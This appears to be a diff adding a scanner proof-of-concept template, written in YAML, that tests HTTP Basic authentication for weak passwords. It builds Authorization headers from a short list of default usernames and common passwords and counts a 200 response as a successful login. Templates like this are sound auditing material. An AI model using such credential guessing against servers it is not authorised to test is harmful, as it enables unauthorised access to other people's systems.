@@ -1,0 +1,39 @@
+id: poc-yaml-http-basic-weak-pass
+info:
+  name: HTTP Basic 认证弱口令
+  severity: high
+  tags:
+  - 弱口令
+  finger: ''
+variables:
+  username: 'admin
+
+    admin123
+
+    root
+
+    '
+  password: '123456
+
+    password
+
+    admin123
+
+    P@ssw0rd
+
+    secret
+
+    root
+
+    '
+firstRequest:
+  method: GET
+  path: /
+  expression: status_code == 401
+requests:
+- method: GET
+  path: /
+  headers:
+    Authorization: Basic {{concat .username ":" .password | base64}}
+  expression: status_code == 200
+transport: http
